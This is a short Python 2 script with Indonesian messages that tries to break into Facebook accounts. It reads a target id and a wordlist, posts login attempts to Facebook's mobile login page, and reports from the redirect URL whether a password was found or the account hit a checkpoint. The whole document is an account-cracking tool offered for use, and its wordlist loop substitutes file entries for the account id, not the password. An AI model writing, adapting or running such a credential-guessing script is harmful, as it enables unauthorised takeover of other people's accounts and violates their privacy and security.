import requests, sys











r = requests.Session()


id = raw_input("input id target : ")
pw = raw_input("input worldlist : ")

def menu1(id,pw):
    url = "https://m.facebook.com/login.php"



    respon = requests.post(url, data = {"email":id, "pass":pw, "login":"submit"})

    print(respon.url)
    if "_rdc=1&_rdr" in respon.url:
        print "[+] PASSWORD DITEMUKAN",id
        sys.exit(1)
    elif "checkpoint" in respon.url:
        print "akun checkpoint",id
    else:
        print "PASSWORD SALAH",id

def menu2(id,pw):
    ex = open("worldlist.txt", "r").readlines()
    for i in ex:
             menu1(i.strip(),pw)


try:
    menu2(id,pw)

except:
    exit()
